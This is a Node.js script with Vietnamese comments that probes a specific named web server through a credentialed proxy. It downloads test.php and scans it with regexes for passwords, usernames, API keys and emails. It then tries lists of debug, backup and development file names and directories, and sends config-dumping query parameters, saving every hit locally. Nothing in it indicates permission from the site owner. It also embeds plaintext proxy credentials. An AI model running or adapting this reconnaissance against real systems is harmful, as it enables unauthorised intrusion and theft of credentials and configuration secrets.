const axios = require('axios');
const { HttpProxyAgent } = require('http-proxy-agent');
const fs = require('fs');

// Proxy configuration 
const proxyUrl = 'http://beba111:tDV5tkMchYUBMD@ip.mproxy.vn:12301';
const baseUrl = 'http://vssapp.teca.vn:8088';

console.log('🔍 KHÁM PHÁ FILE TEST.PHP VÀ SENSITIVE FILES');
console.log('=' * 60);

function createClient() {
  return axios.create({
    httpAgent: new HttpProxyAgent(proxyUrl),
    timeout: 15000,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8'
    }
  });
}

// Khám phá chi tiết test.php
async function exploreTestPHP() {
  console.log('\n🔍 KHÁM PHÁ CHI TIẾT TEST.PHP');
  console.log('─'.repeat(50));
  
  const client = createClient();
  
  try {
    console.log('📥 Đang tải test.php...');
    const response = await client.get(`${baseUrl}/test.php`);
    
    console.log(`✅ Status: ${response.status}`);
    console.log(`📏 Content Length: ${response.data ? response.data.length : 'undefined'} chars`);
    console.log(`📄 Content Type: ${response.headers['content-type']}`);
    
    const content = response.data;
    
    if (content) {
      // Save content để phân tích
      const filename = `/workspace/docs/test_php_content.txt`;
      fs.writeFileSync(filename, content);
      console.log(`💾 Đã lưu nội dung vào: ${filename}`);
      
      // Phân tích nội dung
      console.log('\n📋 PHÂN TÍCH NỘI DUNG:');
      console.log('─'.repeat(30));
      
      const contentStr = content.toString().toLowerCase();
      
      // Preview first 1000 chars
      console.log('📝 Preview (first 1000 chars):');
      console.log(content.toString().substring(0, 1000));
      
      // Tìm kiếm thông tin nhạy cảm
      const sensitivePatterns = [
        { name: 'Passwords', regex: /(password|pwd|pass)\s*[=:]\s*['"]([^'"]+)['"]/gi },
        { name: 'Usernames', regex: /(username|user|login)\s*[=:]\s*['"]([^'"]+)['"]/gi },
        { name: 'Database', regex: /(database|db_name|mysql)\s*[=:]\s*['"]([^'"]+)['"]/gi },
        { name: 'API Keys', regex: /(api_key|key|token)\s*[=:]\s*['"]([^'"]+)['"]/gi },
        { name: 'Config', regex: /(config|setting)\s*[=:]\s*['"]([^'"]+)['"]/gi },
        { name: 'URLs', regex: /(http[s]?:\/\/[^\s'"]+)/gi },
        { name: 'Email', regex: /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/gi }
      ];
      
      let foundSecrets = false;
      
      sensitivePatterns.forEach(pattern => {
        const matches = content.toString().match(pattern.regex);
        if (matches) {
          console.log(`\n🔑 ${pattern.name} found:`);
          matches.slice(0, 5).forEach(match => console.log(`   ${match}`));
          foundSecrets = true;
        }
      });
      
      if (!foundSecrets) {
        console.log('\n✅ Không tìm thấy thông tin nhạy cảm rõ ràng trong pattern search');
      }
      
      // Tìm kiếm keywords cụ thể
      const keywords = ['admin', 'root', 'password', 'login', 'user', 'auth', 'test', 'demo'];
      console.log('\n🔍 Keyword analysis:');
      keywords.forEach(keyword => {
        if (contentStr.includes(keyword)) {
          console.log(`   ✅ Contains: "${keyword}"`);
        }
      });
      
    } else {
      console.log('❌ Nội dung file trống hoặc không đọc được');
    }
    
  } catch (error) {
    console.log(`❌ Lỗi: ${error.message}`);
    if (error.response) {
      console.log(`📊 Status: ${error.response.status}`);
      console.log(`📄 Error data: ${error.response.data}`);
    }
  }
}

// Thử các biến thể của test.php
async function tryTestFileVariants() {
  console.log('\n🔍 THỬ CÁC BIẾN THỂ CỦA TEST FILES');
  console.log('─'.repeat(50));
  
  const client = createClient();
  
  const testFiles = [
    'test.php',
    'test1.php', 
    'test2.php',
    'testing.php',
    'debug.php',
    'dev.php',
    'development.php',
    'temp.php',
    'tmp.php',
    'demo.php',
    'example.php',
    'sample.php',
    'backup.php',
    'old.php',
    'new.php'
  ];
  
  const foundFiles = [];
  
  for (let file of testFiles) {
    try {
      console.log(`   🔍 ${file}`);
      const response = await client.get(`${baseUrl}/${file}`);
      
      if (response.status === 200 && response.data) {
        console.log(`   ✅ FOUND: ${file} (${response.data.length} chars)`);
        foundFiles.push(file);
        
        // Save each found file
        const filename = `/workspace/docs/found_${file.replace('.', '_')}.txt`;
        fs.writeFileSync(filename, response.data);
        console.log(`   💾 Saved: ${filename}`);
      }
      
    } catch (error) {
      if (error.response?.status === 403) {
        console.log(`   🔒 FORBIDDEN: ${file}`);
      }
      // Ignore 404s
    }
    
    await new Promise(resolve => setTimeout(resolve, 300));
  }
  
  return foundFiles;
}

// Tìm kiếm directories có thể chứa test files
async function searchTestDirectories() {
  console.log('\n🔍 TÌM KIẾM TEST DIRECTORIES');
  console.log('─'.repeat(50));
  
  const client = createClient();
  
  const testDirs = [
    'test/',
    'tests/', 
    'testing/',
    'debug/',
    'dev/',
    'development/',
    'temp/',
    'tmp/',
    'demo/',
    'examples/',
    'samples/',
    'backup/',
    'old/',
    'admin/test/',
    'admin/debug/'
  ];
  
  for (let dir of testDirs) {
    try {
      console.log(`   🔍 ${dir}`);
      const response = await client.get(`${baseUrl}/${dir}`);
      
      if (response.status === 200) {
        console.log(`   ✅ ACCESSIBLE: ${dir}`);
        
        // Save directory listing if available
        if (response.data.includes('<a href=') || response.data.includes('Index of')) {
          console.log(`   📁 Directory listing available!`);
          const filename = `/workspace/docs/dir_${dir.replace(/[\/]/g, '_')}.html`;
          fs.writeFileSync(filename, response.data);
          console.log(`   💾 Saved listing: ${filename}`);
        }
      }
      
    } catch (error) {
      if (error.response?.status === 403) {
        console.log(`   🔒 FORBIDDEN: ${dir} (exists but protected)`);
      }
    }
    
    await new Promise(resolve => setTimeout(resolve, 400));
  }
}

// Thử parameter injection với test.php
async function testParameterInjection() {
  console.log('\n🔍 TEST PARAMETER INJECTION');
  console.log('─'.repeat(50));
  
  const client = createClient();
  
  const parameters = [
    '?action=info',
    '?debug=1',
    '?test=1',
    '?show=config',
    '?mode=debug',
    '?env=development',
    '?admin=1',
    '?phpinfo=1',
    '?info=1',
    '?config=1',
    '?dump=1',
    '?backup=1'
  ];
  
  for (let param of parameters) {
    try {
      console.log(`   🔍 test.php${param}`);
      const response = await client.get(`${baseUrl}/test.php${param}`);
      
      if (response.status === 200 && response.data) {
        const content = response.data.toString();
        console.log(`   ✅ Response: ${content.length} chars`);
        
        // Check if response is different from default
        if (content.length > 1000 || content.includes('config') || 
            content.includes('debug') || content.includes('info')) {
          console.log(`   🎯 INTERESTING RESPONSE!`);
          
          const filename = `/workspace/docs/test_param_${param.replace(/[?=]/g, '_')}.txt`;
          fs.writeFileSync(filename, content);
          console.log(`   💾 Saved: ${filename}`);
        }
      }
      
    } catch (error) {
      // Ignore errors
    }
    
    await new Promise(resolve => setTimeout(resolve, 200));
  }
}

// Main execution
async function main() {
  try {
    // Step 1: Khám phá test.php chi tiết
    await exploreTestPHP();
    
    // Step 2: Thử các biến thể test files
    const foundFiles = await tryTestFileVariants();
    
    // Step 3: Tìm test directories  
    await searchTestDirectories();
    
    // Step 4: Test parameter injection
    await testParameterInjection();
    
    // Summary
    console.log('\n📊 SUMMARY');
    console.log('=' * 60);
    console.log(`📁 Additional test files found: ${foundFiles.length}`);
    if (foundFiles.length > 0) {
      console.log('📋 Files found:');
      foundFiles.forEach(file => console.log(`   - ${file}`));
    }
    
    console.log('\n🎯 SENSITIVE FILE EXPLORATION COMPLETED!');
    console.log('💡 Check saved files in /workspace/docs/ for analysis');
    
  } catch (error) {
    console.error('💥 Error:', error.message);
  }
}

main();